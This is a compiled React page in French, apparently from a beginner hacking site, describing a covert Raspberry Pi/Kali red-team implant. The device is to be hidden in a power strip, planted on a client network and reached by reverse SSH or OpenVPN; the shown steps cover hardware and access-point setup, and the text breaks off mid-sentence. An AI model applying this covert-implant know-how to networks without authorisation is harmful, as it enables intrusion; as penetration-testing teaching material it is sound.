{"ast":null,"code":"var _jsxFileName = \"C:\\\\Users\\\\Nico\\\\hackingfornoobs_frontend\\\\src\\\\components\\\\Redteam.js\";\nimport React from 'react';\nimport Hide from \"../img/hide_raspberry.jpg\";\nimport Methodo from \"../img/methodo.jpg\";\nimport KaliRaspberry from \"../img/kali_raspberry.png\";\n\nclass Redteam extends React.Component {\n  render() {\n    return React.createElement(\"div\", {\n      className: \"article\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 10\n      },\n      __self: this\n    }, React.createElement(\"h1\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 12\n      },\n      __self: this\n    }, \"Redteam\"), React.createElement(\"hr\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 14\n      },\n      __self: this\n    }), React.createElement(\"p\", {\n      className: \"tabulation\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 15\n      },\n      __self: this\n    }, \"Une nouvelle tendance \\xE9merge du c\\xF4t\\xE9 des attaques informatiques, les techniques d\\u2019intrusion se professionnalisent, s\\u2019industrialisent et s\\u2019\\xE9tendent dans le temps. L\\xE0 o\\xF9 des \\xAB amateurs \\xBB n\\u2019avaient qu\\u2019\\xE0 ex\\xE9cuter un script sur un syst\\xE8me vuln\\xE9rable autrefois, des \\xE9quipes exp\\xE9riment\\xE9es peuvent passer des mois sur une seule et m\\xEAme cible aujourd\\u2019hui, \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 15\n      },\n      __self: this\n    }, \"APT (Advanced Persitent Threat).\"), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 15\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 15\n      },\n      __self: this\n    }), \"Pour s'adapter les entreprises de s\\xE9curit\\xE9 propose depuis peu une nouvelle approche dans la r\\xE9alisation d\\u2019un test d\\u2019intrusion : L\\u2019approche \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 17\n      },\n      __self: this\n    }, \"RedTeam\"), \". Dans cette approche, l\\u2019objectif de l\\u2019\\xE9quipe attaquante est de passer d'une position de personne ext\\xE9rieure \\xE0 l\\u2019entreprise jusqu\\u2019\\xE0 la r\\xE9alisation d\\u2019une ou plusieurs actions critiques au sein du SI cibl\\xE9. Par rapport \\xE0 un pentest il s'agit g\\xE9n\\xE9ralement d'une mission d'une dur\\xE9e beaucoup plus longue et avec plus de techniques possibles (ex: phishing, intrusion physique).\"), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 20\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 21\n      },\n      __self: this\n    }), React.createElement(\"h2\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 23\n      },\n      __self: this\n    }, \"Contexte\"), React.createElement(\"p\", {\n      className: \"tabulation\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 24\n      },\n      __self: this\n    }, \"L'objectif de notre projet de Redteam est de cr\\xE9er un implant qui une fois sur le r\\xE9seau d'un client se reconnecterait automatiquement \\xE0 notre serveur interne, avec \\xE0 disposition toute la boite \\xE0 outils de pentest. Cela repr\\xE9senterait la phase de compromission initiale dans le sch\\xE9ma de redteam suivant: \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 24\n      },\n      __self: this\n    }), React.createElement(\"img\", {\n      id: \"methodoredteam\",\n      src: Methodo,\n      alt: \"m\\xE9thodologie redteam\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 25\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 26\n      },\n      __self: this\n    }), \"Un sc\\xE9nario de Redteam possible serait de p\\xE9n\\xE9trer dans une soci\\xE9t\\xE9 cliente en se d\\xE9guisant et de placer l'implant sur le r\\xE9seau, afin d'obtenir \\xE0 distance un acc\\xE8s \\xE0 leur r\\xE9seau via une connexion OpenVPN ou un tunnel SSH invers\\xE9.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 28\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 28\n      },\n      __self: this\n    }), \"Des outils tels que \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 30\n      },\n      __self: this\n    }, \"la LAN Turtle\"), \" existent d\\xE9j\\xE0 mais l'on souhaiterait avoir le contr\\xF4le total de nos outils. Plusieurs m\\xE9thodes doivent \\xEAtre impl\\xE9ment\\xE9es au cas o\\xF9 le pare-feu du client bloquerait certains flux sortants. L'implant doit \\xE9galement avoir une m\\xE9thode alternative pour se connecter au cas o\\xF9 leurs r\\xE8gles de pare-feu bloqueraient le trafic, une configuration sans fil pour l'appareil est donc \\xE0 envisager.\"), React.createElement(\"img\", {\n      id: \"kaliraspberry\",\n      src: KaliRaspberry,\n      alt: \"kali raspberry\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 33\n      },\n      __self: this\n    }), React.createElement(\"h2\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 35\n      },\n      __self: this\n    }, \"Cahier des charges de la box\"), React.createElement(\"div\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 36\n      },\n      __self: this\n    }, \"Plusieurs appareils peuvent convenir, les crit\\xE8res principaux \\xE9tant sa fiabilit\\xE9, sa l\\xE9g\\xE8ret\\xE9, sa taille, sa rapidit\\xE9 et son co\\xFBt:\", React.createElement(\"ul\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 38\n      },\n      __self: this\n    }, React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 39\n      },\n      __self: this\n    }, \"l'appareil doit \\xEAtre \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 39\n      },\n      __self: this\n    }, \"petit\"), \" (facile \\xE0 dissimuler)\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 40\n      },\n      __self: this\n    }, \"possibilit\\xE9 d'utiliser un \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 40\n      },\n      __self: this\n    }, \"tunnel SSH inverse persistant\"), \" et/ou \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 40\n      },\n      __self: this\n    }, \"OpenVPN\"), \" pour le C&C\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 41\n      },\n      __self: this\n    }, \"espace de \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 41\n      },\n      __self: this\n    }, \"stockage\"), \" (au moins 32 Go)\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 42\n      },\n      __self: this\n    }, \"mat\\xE9riel \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 42\n      },\n      __self: this\n    }, \"rapide\")), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 43\n      },\n      __self: this\n    }, React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 43\n      },\n      __self: this\n    }, \"faible co\\xFBt\"), \" (en cas de destruction ou de vol)\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 44\n      },\n      __self: this\n    }, \"possibilit\\xE9 d'ajouter des modules pour la \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 44\n      },\n      __self: this\n    }, \"connexion sans fil\"))), \"Il existe de nombreux appareils comme le Hardkernel ODROID-N2, ou encore le Beaglebone Black mais pour le prix la simplicit\\xE9 et les autres crit\\xE8res, on pr\\xE9f\\xE9rera utiliser la \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 46\n      },\n      __self: this\n    }, \"Raspberry Pi 4.\")), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 48\n      },\n      __self: this\n    }), React.createElement(\"h2\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 50\n      },\n      __self: this\n    }, \"Shopping list pour le mat\\xE9riel\"), React.createElement(\"div\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 51\n      },\n      __self: this\n    }, React.createElement(\"ul\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 52\n      },\n      __self: this\n    }, React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 53\n      },\n      __self: this\n    }, React.createElement(\"a\", {\n      href: \"https://www.canakit.com/raspberry-pi-4-starter-kit.html\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 53\n      },\n      __self: this\n    }, \"Raspberry Pi 4 Model B with 4GB RAM (Basic Kit) - $100\")), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 54\n      },\n      __self: this\n    }, React.createElement(\"a\", {\n      href: \"https://www.amazon.com/dp/B07FCMBLV6\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 54\n      },\n      __self: this\n    }, \"SanDisk 64GB Extreme microSDXC UHS-I Memory Card - $15\")), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 55\n      },\n      __self: this\n    }, React.createElement(\"a\", {\n      href: \"https://vilros.com/collections/raspberry-pi-accessories/products/vilros-raspberry-pi-4-compatible-clear-transparent-case-with-built-in-fan\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 55\n      },\n      __self: this\n    }, \"Raspberry Pi 4 Case with Fan - $10 (optional)\")), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 56\n      },\n      __self: this\n    }, React.createElement(\"a\", {\n      href: \"https://www.amazon.com/gp/product/B01KWQAQ00/ref=ppx_yo_dt_b_asin_title_o00_s00?ie=UTF8&psc=1\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 56\n      },\n      __self: this\n    }, \"Wireless WiFi USB Dongle Stick Adapter RT5370 150Mbps - $9 (optional)\")))), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 60\n      },\n      __self: this\n    }), React.createElement(\"h2\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 62\n      },\n      __self: this\n    }, \"Syst\\xE8me d'exploitation\"), React.createElement(\"p\", {\n      className: \"tabulation\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 63\n      },\n      __self: this\n    }, \"Comme syst\\xE8me d'exploitation, on retiendra la distribution \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 63\n      },\n      __self: this\n    }, \"Kali Linux\"), \" car elle poss\\xE8de d\\xE9j\\xE0 beaucoup d'outils de pentest, pas besoin d'installation et c'est simple \\xE0 utiliser pour tous les pentesters.\"), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 65\n      },\n      __self: this\n    }), React.createElement(\"h2\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 67\n      },\n      __self: this\n    }, \"Wifi\"), React.createElement(\"p\", {\n      className: \"tabulation\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 68\n      },\n      __self: this\n    }, \"La Raspberry Pi 4 dispose d\\xE9j\\xE0 d'une carte sans fil int\\xE9gr\\xE9e (sans fil 2,4 GHz et 5,0 GHz IEEE 802.11ac), et g\\xE8re l'\", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 68\n      },\n      __self: this\n    }, \"injection de paquets\"), \" et \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 68\n      },\n      __self: this\n    }, \"le mode moniteur\"), \" (contrairement \\xE0 la Pi 3). Un autre adaptateur sans fil permettrait d'avoir une meilleure port\\xE9e lors d'attaques sans fil. Un adaptateur sans fil dot\\xE9 d'un chipset RT5370 serait un bon choix, en plus de prendre en charge le mode moniteur, et l'injection de paquets avec des outils comme \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 70\n      },\n      __self: this\n    }, \"Aireplay-ng\"), \", il a une large bande de fr\\xE9quences utilisables. Ainsi on peut se connecter \\xE0 un adaptateur via \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 70\n      },\n      __self: this\n    }, \"hostapd\"), \"et utiliser l'autre adaptateur afin de r\\xE9aliser les attaques.\"), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 72\n      },\n      __self: this\n    }), React.createElement(\"h2\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 74\n      },\n      __self: this\n    }, \"Comment dissimuler la Raspberry ?\"), React.createElement(\"p\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 75\n      },\n      __self: this\n    }, \"L'une des m\\xE9thodes la plus simple et efficace est de la cacher \\xE0 l'int\\xE9rieur d'une multiprise comme suit :\"), React.createElement(\"img\", {\n      id: \"hide_raspberry\",\n      src: Hide,\n      alt: \"id\\xE9e pour chacher raspberry\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 76\n      },\n      __self: this\n    }), React.createElement(\"hr\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 78\n      },\n      __self: this\n    }), React.createElement(\"h2\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 80\n      },\n      __self: this\n    }, \"Configuration initiale\"), React.createElement(\"div\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 81\n      },\n      __self: this\n    }, \"Les diff\\xE9rentes \\xE9tapes:\", React.createElement(\"ol\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 82\n      },\n      __self: this\n    }, React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 83\n      },\n      __self: this\n    }, \"Configurer l'image Kali pour la carte MicroSD\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 84\n      },\n      __self: this\n    }, \"Configurer un point d'acc\\xE8s WiFi avec hostapd\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 85\n      },\n      __self: this\n    }, \"Configurer un tunnel SSH inverse automatique\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 86\n      },\n      __self: this\n    }, \"Configurer le client et le serveur OpenVPN\"))), React.createElement(\"h3\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 89\n      },\n      __self: this\n    }, \"Installation de Kali Linux\"), React.createElement(\"a\", {\n      href: \"https://www.offensive-security.com/kali-linux-arm-images/#1493408272250-e17e9049-9ce8\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 90\n      },\n      __self: this\n    }, \"Kali Linux\"), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 92\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 93\n      },\n      __self: this\n    }), React.createElement(\"div\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 95\n      },\n      __self: this\n    }, React.createElement(\"h4\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 96\n      },\n      __self: this\n    }, \"Pour Windows\"), \"Avec un adaptateur microSD vers USB connectez la carte MicroSD \\xE0 votre syst\\xE8me Windows.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 97\n      },\n      __self: this\n    }), \"D\\xE9compressez l'archive.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 98\n      },\n      __self: this\n    }), \"Utilisez Win32DiskImager ou Rufus pour \\xE9crire l'image disque Kali sur la carte MicroSD.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 99\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 101\n      },\n      __self: this\n    }), React.createElement(\"h4\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 103\n      },\n      __self: this\n    }, \"Pour Linux\"), \"Avec un adaptateur MicroSD vers USB connectez la carte MicroSD au syst\\xE8me Linux.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 104\n      },\n      __self: this\n    }), \"Utilisez la commande \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 105\n      },\n      __self: this\n    }, \"dd\"), \" pour cr\\xE9er une image du fichier Kali sur la carte MicroSD.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 105\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 107\n      },\n      __self: this\n    }), React.createElement(\"h4\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 109\n      },\n      __self: this\n    }, \"Installation\"), \"Mettez la Raspberry sous secteur, branchez un clavier et un \\xE9cran avec un c\\xE2ble HDMI et connectez-vous \\xE0 Kali Linux avec le nom d'utilisateur \\\"root\\\" et le mot de passe \\\"toor\\\".\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 110\n      },\n      __self: this\n    }), \"Veillez \\xE0 connecter un c\\xE2ble Ethernet sur la Raspberry Pi 4 pour l'acc\\xE8s internet, elle devrait alors automatiquement r\\xE9cup\\xE9rer une adresse IP via DHCP.\"), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 115\n      },\n      __self: this\n    }), React.createElement(\"h3\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 117\n      },\n      __self: this\n    }, \"Configurer un point d'acc\\xE8s wifi avec hostpad\"), React.createElement(\"div\", {\n      id: \"wifi\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 118\n      },\n      __self: this\n    }, \"apt-get install hostapd \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 118\n      },\n      __self: this\n    }), \"apt-get install pciutils\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 119\n      },\n      __self: this\n    }), \"nano /etc/network/interfaces\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 121\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 121\n      },\n      __self: this\n    }), \"##Le fichier /etc/network/interfaces devrait ressembler \\xE0:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 122\n      },\n      __self: this\n    }), \"auto lo\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 124\n      },\n      __self: this\n    }), \"iface lo inet loopback\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 125\n      },\n      __self: this\n    }), \"auto eth0\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 126\n      },\n      __self: this\n    }), \"iface eth0 inet dhcp\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 127\n      },\n      __self: this\n    }), \"auto wlan0\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 128\n      },\n      __self: this\n    }), \"allow-hotplug wlan0\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 129\n      },\n      __self: this\n    }), \"iface wlan0 inet static\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 130\n      },\n      __self: this\n    }), \"address 172.16.66.1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 131\n      },\n      __self: this\n    }), \"netmask 255.255.255.0\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 132\n      },\n      __self: this\n    }), \"gateway 172.16.66.1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 133\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 135\n      },\n      __self: this\n    }), \"##Install a DHCP server that will serve WiFi clients:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 137\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 137\n      },\n      __self: this\n    }), \"apt-get install udhcpd\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 139\n      },\n      __self: this\n    }), \"nano /etc/udhcpd.conf\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 141\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 141\n      },\n      __self: this\n    }), \"##Add the following to the end of the file:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 142\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 142\n      },\n      __self: this\n    }), \"start           172.16.66.50\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 144\n      },\n      __self: this\n    }), \"end             172.16.66.70\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 145\n      },\n      __self: this\n    }), \"interface       wlan0\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 146\n      },\n      __self: this\n    }), \"# Optional\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 147\n      },\n      __self: this\n    }), \"opt     dns     1.1.1.1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 148\n      },\n      __self: this\n    }), \"option  subnet  255.255.255.0\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 149\n      },\n      __self: this\n    }), \"opt     router  172.16.66.1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 150\n      },\n      __self: this\n    }), \"option  domain  local\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 151\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 152\n      },\n      __self: this\n    }), \"##Create a file for udhcpd.leases:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 153\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 153\n      },\n      __self: this\n    }), \"touch /var/lib/misc/udhcpd.leases\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 155\n      },\n      __self: this\n    }), \"##Edit the /etc/default/udhcpd file \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 156\n      },\n      __self: this\n    }), \"and change the DHCPD_ENABLED=\\u201Dno\\u201D to \\u201Cyes\\u201D:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 156\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 156\n      },\n      __self: this\n    }), \"DHCPD_ENABLED=\\u201Dyes\\u201D\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 158\n      },\n      __self: this\n    }), \"##Create the file /etc/hostapd/hostapd.conf\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 159\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 159\n      },\n      __self: this\n    }), \"nano /etc/hostapd/hostapd.conf\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 161\n      },\n      __self: this\n    }), \"##Copy the following into the hostapd.conf file :\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 162\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 162\n      },\n      __self: this\n    }), \"# Interface configuration\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 164\n      },\n      __self: this\n    }), \"interface=wlan0\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 165\n      },\n      __self: this\n    }), \"ssid=iphone10\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 166\n      },\n      __self: this\n    }), \"channel=6\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 167\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 167\n      },\n      __self: this\n    }), \"# WPA Configuration\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 169\n      },\n      __self: this\n    }), \"macaddr_acl=0\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 170\n      },\n      __self: this\n    }), \"auth_algs=1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 171\n      },\n      __self: this\n    }), \"ignore_broadcast_ssid=0\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 172\n      },\n      __self: this\n    }), \"wpa=2\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 173\n      },\n      __self: this\n    }), \"wpa_passphrase=SuperSecretSquirrel\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 174\n      },\n      __self: this\n    }), \"wpa_key_mgmt=WPA-PSK\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 175\n      },\n      __self: this\n    }), \"rsn_pairwise=CCMP\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 176\n      },\n      __self: this\n    }), \"#Hardware Configuration\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 178\n      },\n      __self: this\n    }), \"driver=nl80211\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 179\n      },\n      __self: this\n    }), \"ieee80211n=1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 180\n      },\n      __self: this\n    }), \"hw_mode=g\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 181\n      },\n      __self: this\n    }), \"wmm_enabled=1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 182\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 182\n      },\n      __self: this\n    }), \"nano /etc/init.d/hostapd\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 185\n      },\n      __self: this\n    }), \"##Change the line to the following:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 186\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 186\n      },\n      __self: this\n    }), \"DAEMON_CONF=/etc/hostapd/hostapd.conf\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 188\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 188\n      },\n      __self: this\n    }), \"nano /etc/default/hostapd\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 190\n      },\n      __self: this\n    }), \"##Change the line to the following:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 191\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 191\n      },\n      __self: this\n    }), \"DAEMON_CONF=\\\"/etc/hostapd/hostapd.conf\\\" update-rc.d hostapd enable ##Now, we need to enable IP forwarding in the kernel for forwarding packets for our client devices to the Internet:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 196\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 196\n      },\n      __self: this\n    }), \"sysctl -w net.ipv4.ip_forward=1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 198\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 198\n      },\n      __self: this\n    }), \"nano /etc/sysctl.conf\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 200\n      },\n      __self: this\n    }), \"[Remove the \\u201C#\\u201D in front 